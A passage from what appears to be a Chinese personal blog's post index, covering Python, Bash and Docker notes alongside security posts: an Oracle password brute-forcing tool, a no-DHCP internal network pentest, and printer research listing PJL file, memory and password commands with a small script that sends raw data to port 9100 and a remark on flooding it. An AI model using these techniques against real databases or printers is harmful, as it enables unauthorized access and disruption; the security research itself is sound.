    <content type="text"><![CDATA[python27的编码是一大难点，然而这次的难点并不是在于python，而在于数据库。前言最近在使用Pymysql向mysql数据库写入中文时，发现出现Warning:(1366, u”Incorrect string value: ‘\x······”)数据库里面的结果为乱码解决思路看到中文乱码，马上就想到编码问题。该问题共涉及到三处编码（有可能还多，想不出来了）：数据库编码、数据来源编码、脚本连接编码。由于数据来源编码能肯定为Unicode，因此需要从脚本连接编码、数据库编码去解决。解决历程脚本连接编码由于pymysql支持charset字段，下意识想到通过charset参数进行设置。123456789101112import pymysql.cursors config = &#123; 'host':'127.0.0.1', 'port':3306, 'user':'root', 'password':'', 'db':'test', 'charset':'utf8mb4', 'cursorclass':pymysql.cursors.DictCursor, &#125;connection = pymysql.connect(**config)然后重新运行脚本，发现并没有解决。数据库编码查看数据库编码，发现数据库默认编码为latin1。1show variables like "char%";找到问题所在就方便了！修改database编码即可。由于我使用的是debian，需要修改/etc/mysql/my.cnf文件。1vim /etc/mysql/my.cnf在[mysqld]字段下面添加character-set-server=utf8，保存并重启mysql服务即可。重新查询数据库编码。美滋滋的运行代码，发现还是Warning！！！最终解决在修改了数据库编码以为脚本可以成功运行的时候，现实跟我说too young！后面兜兜转转，发现重新建立数据库即可！总结Python27遇到中文的时候，需要特别注意编码；Python进行数据交互的时候，每个地方的编码都需要注意；配置修改之后，一定要刷新或者新建！！！]]></content>
      <categories>
        <category>Code</category>
        <category>Python2</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Python2</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux-Bash(一)]]></title>
    <url>%2Farchives%2F33a6bcb.html</url>
    <content type="text"><![CDATA[我回来了，这次接触的是Linux下的shell脚本。前言最近常常在Linux下启动一堆服务，每次重启电脑就得敲一堆命令，让我这个懒癌患者深受困扰！！基于不想把它们加入开机自启的前提，就开始动手写个Bash脚本将它们一键全部启动。Bash解释器shell脚本首行需要有一个固定的格式，其意义表明使用对应解释器解析该脚本，常常有/bin/bash，/bin/sh等，这里我用的是bash:1#!/bin/bash常用语法变量声明：name=变量调用：$name命令行参数获取：12345$0 # 命令行第一个变量 往往为脚本名称$1 # 命令行第二个变量$2 # 命令行第三个变量$3 # 命令行第四个变量$init # 命令行第init变量多分支判断：12345678case str in mode) command ;; mode) command ;;esac编写思路首先定义各个服务的工作目录设置成对应变量，使用分支判断调用不同功能：启动服务、杀死服务进程、修改服务配置等。脚本编写根据编写思路，需要使用到的命令大致分为：启动、杀进程（kill）、修改（seq）等。启动在不同的环境变量下，启动服务的命令不同。在这里我拿启动python为例。12345678#!/bin/bashpython=/usr/bin/pythoncase $1 in start) $python ;;esac使用./shell.sh start来启动python杀进程Linux下使用kill命令即可杀进程，在这里我拿杀死启动的python为例。123456789#!/bin/bashpython=/usr/bin/pythoncase $1 in kill) pid_python=`ps -ef|grep $python|grep -v "$0"|grep -v "grep"|awk '&#123;print $2&#125;'` kill -9 $pid_python ;;esac使用./shell.sh kill来杀死python修改需要对服务配置文件进行修改的时候，使用Linux的seq命令可以完成。12345678#!/bin/bashconfig=/opt/config.cnfcase $1 in config) sed -i 's/port=.*/port=80/g' $config ;esac使用./shell.sh config来修改config.cnf文件总结在编写bash脚本的时候，大部分问题都是由格式、编码等引起。在Windows下编写，在Linux下使用，大概率会由换行符导致脚本无法运行：Windows下换行符为CRLF（正则表达式的\r\n，ASCII码的13和10），Unix（or Linux）下换行符为LF（正则表达式的\n）。这个问题会导致在Linux下运行\r\n为无效参数、vi等编辑器打开会出现^M、脚本头部出现乱码字符等;Linux Shell脚本单引号、双引号在使用时，具有不同效果：单引号为所见即所得、双引号为解析之后所得;seq命令在替换特殊字符时可以用\来转义（正则转义）。完整代码由于这个脚本涉及到一些机密的东西，完整代码不能上传到GitHub。望理解！]]></content>
      <categories>
        <category>Code</category>
        <category>Bash</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Linux</tag>
        <tag>Bash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python2-Oracle爆破]]></title>
    <url>%2Farchives%2F209eed3d.html</url>
    <content type="text"><![CDATA[做渗透的时候遇到Oracle端口对外开放，用python编写脚本去自动爆破，爆破成功就是拿下数据库。环境搭建Oracle安装去Oracle官网下载Oracle Database 11g，下载地址。我这边下载Windows版本进行安装，两个文件都要下载，下载完成之后全部选中解压。解压之后，运行setup.exe。取消【我希望通过My Oracle Support接受安全更新】勾选，点下一步。会跳出一个提示，直接点击【是】即可。选择【创建和配置数据库】。由于我们用来做测试，所以选择【桌面类】即可。接下来对数据库进行配置，我这边将全局数据库名设置为Brute，管理口令设置成BruteTest，别的保持默认即可。如果管理口令不符合Oracle建议的标准，会有一个提示，直接点击【是】即可。接下来程序就会进行检查，待检查完成会出现一个概要。点击完成，开始安装。安装完成之后，点击【口令管理】对用户口令进行修改。对sys、system两个用户设置新口令。如果口令不满足复杂性策略，会有一个提示，直接点击【是】即可。最后Oracle数据库安装成功。Oracle配置安装完成之后，在所有程序菜单中找到Oracle，打开【Database Control - Brute】。使用sys用户、SYSDBA身份登录。表空间点击【服务器】→【表空间】。点击【创建】。输入名称，点击【添加】。输入文件名，点击【继续】。点击【确定】，建立表空间。用户点击【服务器】→【用户】。点击【创建】。输入名称、口令，点击【确定】。由于只是用于爆破，所以这里就不设置【角色】、【权限】等。端口对外开放对listener.ora、tnsnames.ora文件进行修改，文件路径类似：\app\Administrator\product\11.2.0\dbhome_2\NETWORK\ADMIN\，根据安装时所选的目录自行寻找。将两个文件里的localhost修改成计算机名。重启【OracleDBConsoleBrute】、【OracleOraDb11g_home1TNSListener】服务。可以使用其他电脑成功连接。脚本编写Python27有一个库支持对Oracle进行操作，cx_Oracle，使用pip安装即可。1pip install cx_Oracle安装好之后，需要安装Oracle的client，不同系统安装的方式也不同，具体可以参考官方文档。client安装完成之后，使用cx_Oracle尝试连接。信息错误情况的各种错误信息。终端输出爆破时，信息有很多。如果不对样式进行设置，导致不能快速找到有效信息。因此，需要对终端输出设置样式。有一个外部库colorama支持输出时的样式设置，通过pip安装即可.1pip install colorama安装完成之后，需要先调用init进行初始化。12345678910111213# --coding=utf-8--## 参照表## Fore: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.## Back: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.## Style: DIM, NORMAL, BRIGHT, RESET_ALLfrom colorama import init, Fore, Style, Backinit(autoreset=True)print Fore.GREEN + u'字体颜色设置'print Style.DIM + u'字体样式设置'print Back.GREEN + u'背景颜色设置'异步设置使用gevent进行爆破，当爆破量很大的时候，会导致内存飙高。因此，设置了阀值。1234567891011while True: if not blasting.empty(): if len(self.threads) &lt; 5000: self.threads.append(gevent.spawn(self._test, blasting.get())) else: gevent.joinall(self.threads) self.threads = [] else: if len(self.threads) &gt; 0: gevent.joinall(self.threads) break总结在编写Oracle爆破脚本的时候，大部分的问题由环境搭建、配置引起。Oracle安装完成之后，数据库是不对外开放需要修改配置文件，配置文件localhost修改成计算机名，当服务器IP修改时，其他计算机还是可以连接。修改成ip时，服务器IP修改时，需要修改配置文件中的ip；Oracle端口不对外开放，确认配置文件修改正确的情况下，【OracleDBConsoleBrute】、【OracleOraDb11g_home1TNSListener】服务需要重启，网上说只需要重启TNS服务即可，但是测试时，发现两个服务都需要重启；Python终端彩字输出可以使用\033[显示方式;前景色;背景色m + 结尾部分：\033[0m，但Windows下失败，Linux下没去尝试；使用colorama需要先初始化init(autoreset=True)。完整代码完整代码已经上传到我的GiHub。如果有兴趣，不妨移步到Github上一观！Code。]]></content>
      <categories>
        <category>Code</category>
        <category>Python2</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Python2</tag>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全-内网渗透测试（无DHCP）]]></title>
    <url>%2Farchives%2F27b0f6e3.html</url>
    <content type="text"><![CDATA[针对渗透，有句话很符合：只要思想不滑坡，办法总比问题多。前言好久没做过渗透测试，这次因为工作接触一个盲测的项目，特此记录一下。特点这次渗透只给了一个网口,没有DHCP服务，IP需要自己配置、系统IP需要自己去寻找。渗透ing获取IP由于没有DHCP。所以需要知道自己处于什么网段。这个步骤主要通过wireshark来查看ARP包，基本可以知道所处的网段了。但是子网掩码需要自己一个个去猜，可以先从24位(255.255.255.0)开始，逐步递增。如果递增还是不行那就递减吧。像这种ARP包，可以将IP地址配置为10.121.21.x，子网掩码配置成255.255.255.0。先看同网段IP是否可以访问，可以访问就配置网关，网关配置成10.121.21.254，再看10.121.X.X是否可以访问。服务器探测有了IP地址之后，就需要开始去寻找服务器地址了。可以先从C段开始快速探测，如果C段没有目标服务器的话，那就从B段下手。这个过程极其枯燥，建议使用工具：IISPutScanner、Advanced_ip_scanner。总结有了IP、服务器IP就跟平时渗透是一样的。这次难点在于没有DHCP，需要自己去配置对应的IP、寻找目标系统的IP。]]></content>
      <categories>
        <category>安全研究</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全-打印机安全研究]]></title>
    <url>%2Farchives%2F90a5ee4a.html</url>
    <content type="text"><![CDATA[只要你联网，那就有可能存在安全问题。俗称万物皆可’日’。前言打印机是现在办公环境中不可或缺的一个硬件设备,其本身存在很多安全问题。打印机服务有:FTP、Telnet、HTTP、PJL等。看到这么多服务，相信研究人员是非常高兴的。因为服务越多，安全隐患也越多。做安全研究最怕的就是服务很少、功能很少、端口不开放这些。前段时间，由于工作的原因，对打印机安全进行研究与分析。整体流程为:识别打印机→识别服务→常见服务安全分析→打印机专用服务(PJL)安全分析。PJL命令文档可以在HP网站上找到，文档参考1、文档参考2。识别打印机识别打印机可以通过：SNMP发送特定oid识别、Web管理页面识别、PJL命令识别。这里我采用了PJL命令识别，通过向设备的9100端口发送PJL命令，根据返回信息来识别。1@PJL INFO ID通过对打印机发送INFO ID(PJL命令)，打印机会返回其对应的型号。服务识别识别服务的话,用nmap就可以了。可以使用全端口扫描来发现对应服务。1nmap -p 1-65535 -T4 -A -v targetIP常见服务分析打印机常见服务：Telnet、FTP、HTTP。Telnet打印机中Telnet基本都是默认密码或者是空密码。登录之后可以查看配置信息、操作打印机等等。FTP大部分打印机FTP默认密码或空密码。通过上传文件，文件会直接被打印。HTTP打印机的Web存在的问题：爆破破解、越权访问等。这个可通过使用Web渗透的方式进行测试。我测试的时候发现有默认密码、信息泄露等。打印机专用服务(PJL)分析PJL是打印机作业语言:printer job language。PJL语言有固定的格式。对PJL命令文档中的PJL命令进行了整理：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869PJL以"\x1B%-12345@PJL JOB"开始，以"\x1B%-12345"结束，其中每条指令应当独占一行，指令间需要有carriage return（0x0D）。使用者可以自定义指令。@PJL FSDELETE NAME = “pathname” [&lt;CR&gt;]&lt;LF&gt; # 删除文件 @PJL FSDOWNLOAD FORMAT:BINARY [SIZE=int] [&lt;CR&gt;]&lt;LF&gt; # 下载文件到打印机@PJL FSINIT VOLUME = “pathname” [&lt;CR&gt;]&lt;LF&gt; # 初始化打印机文件系统@PJL FSMKDIR NAME = “pathname” [&lt;CR&gt;]&lt;LF&gt; # 创建目录@PJL DINQUIRE CPLOCK # 检查控制面板状态@PJL DINQUIRE PASSWORD # 检查密码保护状态@PJL JOB PASSWORD = [Number:0 to 65535] # 当前密码保护密码@PJL DEFAULT PASSWORD [Number:0 to 65535] # 修改保护密码@PJL DEFAULT CPLOCK = [ON, OFF] # 控制面板状态@PJL SET IOBUFFER = [ON, OFF, AUTO] # 设置缓冲区@PJL SET IOSIZE = [10-100] # 设置缓存区大小@PJL SET PCNAME = [String] # 设置计算机名称@PJL SET HOLD = [ON, JOB, STORE, PROOF] # 设置文件保存@PJL SET HOLDKEY = [Number:0000 to 9999] # 设置保存文件密码@PJL DEFAULT DISKLOCK = [ON, OFF] # 设置硬盘锁定状态@PJL SET SPOOLTIME # 设置打印日期@PJL SET COPIES # 设置打印数@PJL SET JOBNAME # 设置打印机文件名称@PJL SET RESOLUTION # 设置分辨率@PJL SET DRIVERNAME # 设置驱动@PJL USTATUS JOB # 输出 队列中还未打印任务的 状态@PJL COMMENT # 添加注释@PJL SET OUTTRAY #出纸盘(纸张输出位置)@PJL SET ORIENTATION = [PORTRAIT, LANDSCAPE] #页面方向@PJL SET DUPLEX = [ON, OFF] #双工模式(双面打印)@PJL SET BINDING = [LONGEDGE, SHORTEDGE] #双工模式：短边、长边@PJL RNVRAM ADDRESS #读取内存@PJL OPMSG DISPLAY #设置打印机离线脱机@PJL SET SERVICEMODE #设置服务模式@PJL WNVRAM ADDRESS #写入内存@PJL FSDIRLIST NAME #读取目录@PJL FSQUERY NAME #读取文件@PJL FSUPLOAD NAME #文件上传@PJL FSDOWNLOAD #写入文件由于打印机并不去判断PJL命令是谁发起的，因此，只要路由可达任何人都可以对打印机执行PJL命令操作。我测试的时候，发现对打印机的9100端口发送任何数据，打印机都会将其打印出来。如果，通过对9100端口进行DoS，那么，打印机就会不间断的工作。工具Hijetter.exePRETpjl-toolprint.py123456789101112131415# coding=utf-8import socketimport timeimport syswith open('1', 'rb') as f: pdata = f.read() sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((sys.argv[1],9100)) sock.sendall(pdata) recv_data = sock.recv(1024) print recv_data sock.close()总结在对打印机进行安全测试的时候，发现了几个问题特此记录一下：使用网络打印机的时候，流量报文是明文。将流量报文保存，可进行重放，将文档重新打印；测试的打印机使用FTP向打印机上传文件，打印机立即打印，打印之后立马删除。不知道其他打印机是否会立即删除文件；使用Python的socket可以达到快速网络数据发送。]]></content>
      <categories>
        <category>安全研究</category>
        <category>硬件设备</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>打印机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python2-py转exe(附GUI界面)]]></title>
    <url>%2Farchives%2F2329ebda.html</url>
    <content type="text"><![CDATA[有时候写了一个脚本，但是换到另外一台电脑上的时候，发现并没有Python的解析环境，这时候将py文件转成exe，再将其换到另外一台Windows电脑运行，是一个很好的选择。准备py转exe有:py2exe、pyinstaller等多种选择。这两种我都用过，我更倾向于pyinstaller。本文使用的就是pyinstaller。pyinstaller使用pip快捷安装pyinstaller。如果对pyinstaller感兴趣，可以参考文档1pip install pyinstaller如果无法使用pip安装，可以在官网下载源码安装。成功安装可以输出对应版本信息。py文件将py文件转exe，那么必备的就是py文件了。本文采用我以前写的RSA加密文件脚本，可以在这里下载。转换Exe有了pyinstaller之后，将py文件转成exe只需要一条命令即可完成。该条命令会生成两个文件夹:build、dist。生成的exe在dist文件夹中。1pyinstaller Encryptiong.py单文件生成刚刚转换出来的exe有许多依赖的文件在dist文件夹下。就是说想要运行这个exe，那么整个dist文件夹下所有文件都需要存在。pyinstaller提供了将py文件转换成单exe模式，只需要在转换命令加上-F参数即可。1pyinstaller Encryptiong.py -F压缩如果转换出来的exe大小很大，pyinstaller也支持压缩。压缩需要下载upx，并加上对应参数即可。1pyinstaller Encryptiong.py -F --upx-dir D:\Code\Python27\upx394w图标现在已经成功生成了exe，但是现在的exe图标很”大众”。这是pyinstaller默认图标，如果想自定义图标的话，pyinstaller也提供了对应参数-i。但是需要提供多种尺寸的ico图标，因为不同情况下需要不一样尺寸的图标。可以使用png2ico工具转换，使用png2ico需要使用对应的命令。1png2ico myicon.ico icon_128x128.png icon_64x64.png icon_48x48.png icon_32x32.png icon_16x16.png也可以使用在线转换工具ConvertIcon!,导出的时候需要勾对应尺寸。有了图标之后，使用对应命令即可。1pyinstaller Encryptiong.py -F --upx-dir D:\Code\Python27\upx394w -i ico.icoGUI界面现在生成的exe文件，打开之后连GUI界面都没有。没有GUI界面的exe就是耍流氓。(Ps:来源某位小伙伴)我这么正经的人，怎么可能耍流氓！Python想要生成GUI界面，需要安装PyQt。我安装的是PyQt4。由于最新版的PyQt已经不提供Windows二进制安装程序，大家可以安装4.11.4版本。找到合适自己的版本，下载、安装即可。UI生成安装完PyQt4之后，大家可以在Python27\Lib\site-packages\PyQt4文件夹找到designer.exe用来构建GUI界面的UI。打开designer.exe新建一个窗体，通过左边拖拽控件，将控件按照自己喜欢的位置布局到窗体里面。设计好了保存成ui文件即可。最后可以Python27\Lib\site-packages\PyQt4\pyuic4.bat来生成对应的布局代码。1pyuic4.bat -o EncryptiongUi.py EncryptiongUi.ui生成的布局代码文件有一个Ui类，其中包含了setupUi、retranslateUi函数。GUI生成用了UI布局，现在新建一个脚本(Encry.py)通过代码生成一个窗体即可。12345678910111213141516171819202122# -*- coding: utf-8 -*-from PyQt4.QtGui import * from PyQt4 import QtGuifrom PyQt4.QtCore import * import sys import EncryptiongUiclass TestDlg(QDialog, EncryptiongUi.Ui_RSA): # 继承EncryptiongUI.UI_RSA def __init__(self, parent=None): super(TestDlg, self).__init__(parent) self.setupUi(self) # self.setWindowIcon(QtGui.QIcon('./ico.ico')) # 设置icon def main(): app = QApplication(sys.argv) dialog = TestDlg() dialog.show() sys.exit(app.exec_()) if __name__ == '__main__': main()运行Encry.py即可生成一个GUI界面。控件功能配置我设计了一个包含两个line、三个button的窗体。根据button来执行Encryptiong.py的不同功能，根据line的值进行传参。首先对Encryptiong.py脚本进行改造。只需要把180、181注释，让其不运行即可。12# if __name__ == '__main__': # main()其次对EncryptiongUI.py进行改造。导入Encryptiong的Encryptiong，用来执行加密、解密等功能。1from Encryptiong import Encryptiong接下来将按钮的单击属性打开。一共需要打开三个按钮的属性,pushButton是按钮的自定义名称，根据命名进行修改。12self.pushButton.setCheckable(True)self.pushButton.setChecked(True)然后在UI类中，编写工作的函数。1234567891011121314151617def work(self, Ctype): try: if Ctype == 1: Encryptiong().encryp() QtGui.QMessageBox.about(self, u'提醒', u"成功生成公、私钥文件！") # 设置提醒消息框 elif Ctype == 2: public = str(self.lineEdit.text()) # 获取line的文本 filepath = str(self.lineEdit_2.text()) # 获取line2的文本 Encryptiong(public=public, filepath=filepath).encryption() QtGui.QMessageBox.about(self, u'提醒', u"完成加密！") elif Ctype == 3: private = str(self.lineEdit.text()) filepath = str(self.lineEdit_2.text()) Encryptiong(private=private,decrypt=filepath).decrypted() QtGui.QMessageBox.about(self, u'提醒', u"完成解密！") except: QtGui.QMessageBox.about(self, u'警告', u"输入有误,请重新输入！")回到Ui类的setupUi函数，设置按钮单击执行工作函数。123self.pushButton.clicked.connect(lambda : self.work(1)) # 单击调用work函数self.pushButton_2.clicked.connect(lambda : self.work(2))self.pushButton_3.clicked.connect(lambda : self.work(3))现在已经成功让Encryotiong脚本的功能通过GUI界面来执行、实现。最后通过pyinstaller进行打包成exe。1pyinstaller -F -w -i ico.ico --upx-dir D:\Code\Python27\upx394w Encryptiong.py总结在编写使用pyinstaller、PyQt4生成GUI界面的exe时，遇到几个问题，在此记录一下。pyinstaller -i加载图标的时候，图标需要是多种尺寸的图标。要不然某些情况是无法显示的;pyinstaller -w生成无终端窗口需要脚本有GUI界面;PyQt4的Button执行函数，需要使用lambda生成匿名函数;PyQt4的QMessageBox进行弹框提示需要将字符串转成Unicode编码，要不然会乱码。完整代码完整代码已经上传到我的GiHub。如果有兴趣，不妨移步到Github上一观！Code。]]></content>
      <categories>
        <category>Code</category>
        <category>Python2</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Python2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python2-RSA加密文件]]></title>
    <url>%2Farchives%2Ffb3e56b9.html</url>
    <content type="text"><![CDATA[每个人都有自己的小秘密，如何保护好它是非常重要的。我通过Python27结合RSA算法保护我的”小秘密”。准备使用pycrypto库就可以完成RSA加、解密。Pycrypto使用pip快捷安装pycrypto。如果对pycrypto感兴趣，可以参考文档。1pip install pycrypto如果无法使用pip安装，可以在这里下载编译好的源文件进行安装。终端处理终端信息获取可以通过sys.argv或者使用getopt库。syssys.argv是一个列表对象。用来获取终端信息。终端格式示例。1python getinfo.py info1 info2 info3sys.argv[0]是getinfo.py，sys.argv[1]是info1，sys.argv[2]是info2，sys.argv[3]是info3。Getoptgetopt可以用来获取终端参数，实际使用的时候效果比sys.argv好很多。如果对getopt感兴趣，可以参考文档getopt有短格式、长格式。”-h-f:”为短格式，如果后面带冒号说明该参数需要加参数值，不加冒号说明该参数不需要加参数值。”[‘help’, ‘file=’]”为长格式，如果后面带等号说明该参数需要加参数值，如果后面不带等号说明该参数不需要参数值。终端格式示例。1python getinfo.py -h -f=info.txt代码示例。1234567import getoptopt, args = getopt.getopt(sys.argv[1:], "-h-f:",['help', 'file='])for opt_name, opt_value in opts: if opt_name in ('-h', '--help'): print "This is help!" if opt_name in ('-f', '--file'): print opt_valuepycrypto使用pycrypto包含许多加密方式：AES、SHA256、RSA等。出于安全性考虑，我使用RSA来加密文件。生成公、私钥文件RSA加密需要使用到公钥文件、RSA解密需要使用到私钥文件。如果大家对RSA算法不了解的话，可以参考Wiki)。通过上文可以得知，生成自己的公钥、私钥文件是十分重要的。pycrypto支持生成公钥、私钥文件。代码示例。12345678910111213from Crypto import Randomfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5from Crypto.PublicKey import RSArandom_generator = Random.new().read # 伪随机数生成器rsa = RSA.generate(self.generateNum, random_generator) # rsa算法生成private_pem = rsa.exportKey() # 私钥生成with open('private.pem', 'w') as f: # 生成私钥文件 f.write(private_pem)public_pem = rsa.publickey().exportKey() # 公钥生成with open('public.pem', 'w') as f: # 生成公钥文件 f.write(public_pem)RSA加密RSA加密需要使用到公钥文件。代码示例。1234567891011from Crypto import Randomfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5from Crypto.PublicKey import RSAmessage = "My name is Hywell!"with open('public.pem') as f: # 读取公钥文件 key = f.read()rsakey = RSA.importKey(key) # 加载公钥cipher = Cipher_pkcs1_v1_5.new(rsakey)cipher_text = cipher.encrypt(message) # 加密messageRSA解密RSA解密需要使用到私钥文件。代码示例。123456789101112from Crypto import Randomfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5from Crypto.PublicKey import RSAcipher_text = "This is cryptoStr!"random_generator = Random.new().read # 伪随机数生成器with open('ghost-private.pem') as f: # 读取私钥文件 key = f.read()rsakey = RSA.importKey(key) # 加载私钥cipher = Cipher_pkcs1_v1_5.new(rsakey)result = cipher.decrypt(base64.b64decode(encrypt_text), random_generator) # 解密cipher_text总结在编写使用RSA加密文件时，遇到了几个问题，在此记录一下。使用getopt库作为命令行参数获取，使用for获取对应参数的值的时候，获取得到值是以=开头。因此，实际需要使用value[1:]来获取;RSA加密常见的key_size有1024bit、2048bit两种，解密的时候需要选择跟加密时一样的bit;RSA加密单次加密字符的长度有限制，最大为(key_size/8)-11;使用1024bitRSA加密100长度的字符会生成128长度的加密过的字符;使用2048bitRSA加密200长度的字符会生成256长度的加密过的字符。完整代码完整代码支持终端获取参数、文件夹所有文件RSA加密、文件夹所有文件RSA解密。完整代码已经上传到我的GiHub。如果有兴趣，不妨移步到Github上一观！Code。]]></content>
      <categories>
        <category>Code</category>
        <category>Python2</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Python2</tag>
        <tag>小工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[漏洞环境搭建]]></title>
    <url>%2Farchives%2F583f4516.html</url>
    <content type="text"><![CDATA[在进行安全测试的时候，经常需要搭建各种各样、不同配置的漏洞环境。有时候一天不到就能搞定，有时候两三天都没成功。后来发现一个神器:Docer，结合GitHub上面的漏洞靶场可以通过几条命令就能成功”搭建”一个漏洞环境。准备本文选用Debian作为操作环境。大家也可以根据自己的操作系统，安装对应Docker。大家可以去Docker官网查看如何安装，也可以去Docker中文看如何安装。安装Docker安装Docker之前需要在/etc/apt/sources.list文件中添加backports源。使用Vim命令。(下面所有命令建议在root权限下执行，要不然请在命令前加sudo。)1vim /etc/apt/sources.list添加deb http://http.debian.net/debian jessie-backports main，执行更新操作。1apt-get update成功更新之后，安装docker.io。1apt-get install docker.io查看Docker版本信息。1docker --version添加漏洞环境接下来就可以使用Docer添加对应的漏洞环境，那么漏洞环境在哪里找勒？这里我推荐两个地址:phith0h、Medicean。这里我以Struts2-S2-045为例：[S2-045][https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-045]。将环境下载到本地，如果使用命令无法成功下载，那么多下载几次或者设置一下代理(你懂的)。1docker pull medicean/vulapps:s_struts2_s2-045下载完成之后，启动环境。-p后面的参数是将容器的端口映射到本机的端口，-p 80:8080就是将容器的8080端口映射到本机的80端口，可以自定义修改。1docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-045漏洞复现使用Exploit工具复现S2-045漏洞。Docker常用命令查看所有镜像。1docker images拉取镜像。1docker pull保存镜像。1docker save medicean/vulapps:s_struts2_s2-045 &gt; /tmp/s2-045.tar加载镜像。1docker load &lt; /tmp/s2-045.tar查看正在运行的容器。1docker ps停止容器，使用docker ps查看的id来停止对应容器。1docker stop ddedb0cd35e5启动容器。1docker start ddedb0cd35e5关闭容器。1docker kill ddedb0cd35e5删除镜像，如果不知道id可以使用Tab键来进行补全查看。1docker rm id总结使用Docker虽然可以快速的部署漏洞环境，但是这样不容易理解一些由于配置问题导致的漏洞。因此，建议在新漏洞出现之后使用Docker快速复现完成后，自己手工搭建一遍。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞环境搭建</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Environment</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python2-并发爬虫]]></title>
    <url>%2Farchives%2F426443e5.html</url>
    <content type="text"><![CDATA[现在数据就是王道，而爬虫就是获取数据的快速途径之一！准备看标题，咱们就应该知道需要用到Python27。本文通过Python 结合 requests库进行爬取操作，BeautifulSoup4使用lxml进行解析操作，gevent进行并发操作。Python27选择对应的操作系统的Python27进行下载。下载完成进行安装，之后配置环境变量即可。环境变量需要配置两处，一处是Python27的安装目录，一处是Python27安装目录下的Scripts目录。环境变量配置右键【我的电脑】→【属性】，点击【高级系统设置】中的【高级】选项卡中【环境变量】，在【系统变量】窗口中找到【Path】变量。点击【编辑】，加入对应的环境变量（例如D:\Code\Python27、D:\Code\Python27\Scripts）。如果是Win10系统，新建两条即可。如果是Win10等系统，点击编辑之后在后面加入;D:\Code\Python27;D:\Code\Python27\Scripts即可。1python --version1pip --versionRequests使用pip快捷安装requests。1pip install requestsBeautifulSoup使用pip快捷安装BeautifulSoup4。1pip install beautifulsoup4lxml使用pip快捷安装lxml。1pip install lxmlGevent使用pip快捷安装gevent。1pip install gevent爬取流程在准备阶段，咱们已经将“斧柄”、“斧刃”准备好了，到时候把两个组装起来，选一棵树，进行“伐木”工作。爬取流程分为：获得url、访问url、解析页面、获取页面url。入口url由于本文只爬取站点中存在的url，并不取特殊数据。因此，入口url可以自定义输入。1entry_url = raw_input('Place enter the entry url:')请求页面请求页面操作通过使用requests库来完成。如果对requests库感兴趣，可以参考官方文档。想要使用requests库，需要先导入requests库。这步操作就是将斧柄(Pythnon27)、斧刃(requests)组装起来。1import requests接下来就需要使用requests库的get方法。1r = requests.get(entry_url)解析页面通过上面的操作，咱们已经获取了页面的信息。然后就是BeautifulSoup4发挥的时候了。如果对BeautifulSoup4库感兴趣，可以参考官方文档1from bs4 import BeautifulSoup本文爬虫只需要获取站点url即可，不需要获取站点特殊数据。因此，获取a标签的href方法的值即可。123soup = BeautifulSoup(r.text, 'lxml')for i in soup.find('a'): get_url = i.get('href')异步爬取异步爬取可以让程序执行更快，时间既是生命。如果对gevent库感兴趣，可以参考官方文档。队列队列(Queue)适用于多线程编程，让数据安全地在生产者与消费者之间进行信息传递。让url放在队列数据结构中，可以让队列自动帮我们销毁已经被调用的url。123from gevent.queue import QueueurlQueue = Queue()异步工作将工作流程制作成函数，调用gevent.spawn形成工作队列。当适当的时候执行。12345import geventthreads=[]threads.append(gevent.spawn(work, **keyword))gevent.joinall(threads)总结在编写并发爬虫的时候，遇到了几个问题，在此记录一下。url请求是http还是https，如果是https的话，需要将requests的verify设置为False;并发的时候如何判断任务是否已经结束？我是通过判断队列为空并且无待工作的任务，不知道这种判断方式是否可取。有没有好心人告诉我有什么优雅的方式么;如果对并发量不进行设置的话，有可能导致内存飙高。我通过对线程列表进行设置，当线程列表到100时就运行一次。同求优雅的方式;href方法里面存在两种情况：包含域名(href=”http://xxx.com/index.html&quot;)，不包含域名(href=&quot;/index.html“);用户输入与href方法内情况不同。例如用户输入https://www.iassas.com，页面href标签是https://iassas.com（或者两者反一下）。现在就按照用户输入为准;子域名链接爬取，现在判断逻辑不爬取子域名;href方法中的url有可能会带有#(跳转对应页面位置)，模拟浏览器是将#后面所有字符不当成url考虑;url会被url编码，调用urllib.unquote来解码。完整代码完整代码已经上传到我的GiHub。如果有兴趣，不妨移步到Github上一观！Code。由于Web环境千奇百怪，程序出错在所难免。请体谅！]]></content>
      <categories>
        <category>Code</category>
        <category>Python2</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Python2</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[博客配置]]></title>
    <url>%2Farchives%2F459ba203.html</url>
